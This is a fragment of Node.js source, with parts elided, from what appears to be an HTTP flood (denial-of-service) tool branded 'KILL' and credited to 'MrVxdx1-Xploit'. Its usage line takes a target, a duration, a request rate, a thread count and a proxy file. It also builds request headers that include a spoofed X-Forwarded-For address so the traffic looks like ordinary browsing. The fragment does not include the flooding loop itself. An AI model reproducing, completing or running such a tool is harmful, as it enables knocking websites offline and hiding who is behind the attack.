const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Usage: node KILL target time rate thread proxyfile`); process.exit();}
 const headers = {};
...
╚╝╚╝╚╝─╚╝╚╝╚╩═╩╩╝╚══╩═╩═╩═╩═╩══╩══╩╝─╚═╩═╝ 
  ...
  console.log(`User   : MrVxdx1-Xploit`)
  console.log(`╔═════╩════════════════════════════════════════════╩═════╗`)
...
headers["cache-control"] = "max-age=0"; // Set the Cache-Control header value
headers["vary"] = "Accept-Language";
headers["x-content-type-options"] = "nosniff";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
headers["accept-language"] = "en-us,en;q=0.5";
headers["accept-encoding"] = "gzip,deflate";
headers["range"] = "bytes=0-499"; // Adjust the range value according to your needs
headers["accept"] = accept;
headers["referer"] = Ref;
headers["X-Forwarded-For"] = spoofed;
headers["x-forwarded-proto"] = "https";
